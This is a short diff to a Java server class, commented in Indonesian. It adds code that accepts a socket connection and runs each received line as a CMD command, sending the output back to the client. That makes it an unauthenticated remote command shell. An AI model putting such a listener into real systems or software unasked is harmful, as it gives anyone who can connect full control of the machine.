@@ -15,3 +15,19 @@ public class Server {
             ServerSocket serverSocket = new ServerSocket(port);
 
             System.out.println("Server berjalan, menunggu koneksi...");
+            
+            // Terima koneksi dari client
+            Socket clientSocket = serverSocket.accept();
+            System.out.println("Client terhubung!");
+
+            // Buat input dan output stream untuk berkomunikasi dengan client
+            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
+            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
+
+            String command;
+            while ((command = in.readLine()) != null) {
+                System.out.println("Perintah : " + command);
+
+                // Eksekusi perintah CMD dan kirim output ke client
+                executeCommand(command, out);
+            }
